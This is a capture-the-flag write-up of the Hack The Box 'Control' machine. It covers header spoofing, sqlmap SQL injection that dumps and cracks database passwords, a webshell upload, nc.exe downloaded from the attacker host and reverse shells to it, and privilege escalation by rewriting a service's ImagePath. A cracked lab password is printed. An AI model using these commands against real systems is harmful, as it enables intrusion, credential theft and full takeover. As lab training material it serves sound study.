# [Control](https://app.hackthebox.com/machines/control)

```bash
nmap -p- --min-rate 10000 10.10.10.167 -Pn 
```

![Alt text](img/image.png)


After detection of open ports (80,135,3306), let's do greater nmap scan.

```bash
nmap -A -sC -sV -p80,135,3306 10.10.10.167 -Pn
```

![Alt text](img/image-1.png)


While we open web application, goes into '**admin**' page, it doesn't show. It says that it is allowed from internal network.

That's why, we need to check HTTP request headers that maybe we can masqueared ourselves as coming from internal network.

Let's fuzz HTTP request headers.

```bash
wfuzz -c -w headers -u http://10.10.10.167/admin.php -H "FUZZ: 192.168.4.28" --hh 89
```

![Alt text](img/image-3.png)

Also, I need to write ip address due to below thing (source code comment)

![Alt text](img/image-2.png)


Then, I found a [tool](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/) which adds automatically to each request on web application 

![Alt text](img/image-4.png)



For this method, let's do SQL injection (searching products).

![Alt text](img/image-5.png)

I saved the below one as .req file to use via `sqlmap` tool.

![Alt text](img/image-6.png)

![Alt text](img/image-7.png)


I also dumped the passwords of users for Mysql database.

```bash
sqlmap -H "X-Forwarded-For: 192.168.4.28" --random-agent --passwords -r post.req 
```

![Alt text](img/image-8.png)


I cracked this passwords via [Crackstation](https://crackstation.net/)

![Alt text](img/image-9.png)


Now, I grab the payload and replace this via my webshell as below.

![Alt text](img/image-10.png)


I browse the page which I add my webshell '/uploads/dr4ks.php'.

![Alt text](img/image-11.png)


Now, it's time to add `nc` binary into machine, then get reverse shell.

1.First, let's open http server and serve `nc` binary here.
```bash
python3 -m http.server --bind 10.10.16.6 8080
```

![Alt text](img/image-12.png)

2.Then, make a `curl` request into webshell to download script.
```bash
curl '10.10.10.167/uploads/dr4ks.php?cmd=powershell+wget+http://10.10.16.6:8080/nc.exe+-outfile+\windows\temp\nc.exe'
```

![Alt text](img/image-13.png)


Now, it's time to add reverse shell command into webshell.

```bash
curl '10.10.10.167/uploads/dr4ks.php?cmd=\windows\temp\nc.exe+-e+cmd+10.10.16.6+1337'
```

![Alt text](img/image-14.png)


I got reverse shell from port (1337).

![Alt text](img/image-15.png)


I found a password of 'hector' user from SQL Injection.

hector: l33th4x0rhector


Let's use this credentials to become 'hector' user.

```bash
$username = "CONTROL\hector"
$password = "l33th4x0rhector"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

![Alt text](img/image-16.png)


Let's test that our injected credentials worked or not.

```bash
Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
```

![Alt text](img/image-17.png)

Hola worked, let's add reverse shell into here.


1.First, we copy `nc` binary into somewhere on the machine via `wget` command
```bash
wget 10.10.16.6:8080/nc.exe -outfile \windows\system32\spool\drivers\color\nc.exe
```

![Alt text](img/image-18.png)

2.Let's add our reverse shell into command section.
```bash
Invoke-Command -credential $cred -ScriptBlock { \windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.16.6 1338 } -computer localhost
```

![Alt text](img/image-19.png)


I got reverse shell from port (1338).

![Alt text](img/image-20.png)


user.txt

![Alt text](img/image-21.png)


I searched insecure `ACLs(Access Control List)` via `accesschk.exe` tool.

![Alt text](img/image-22.png)


Let's control services which we have **Write permission** or not.

```bash
accesschk.exe "Hector" -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
```

![Alt text](img/image-23.png)

I grab `seclogon` service from here.

![Alt text](img/image-24.png)


Let's add our reverse shell cmdlet via `reg add` command.

```bash
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.16.6 2024 -e cmd.exe" /f
```

![Alt text](img/image-25.png)

Then start the `seclogon` service to configs are located into their places.

```bash
sc start seclogon
```

![Alt text](img/image-26.png)


I got reverse shell from port (2024)..

![Alt text](img/image-27.png)


root.txt

![Alt text](img/image-29.png)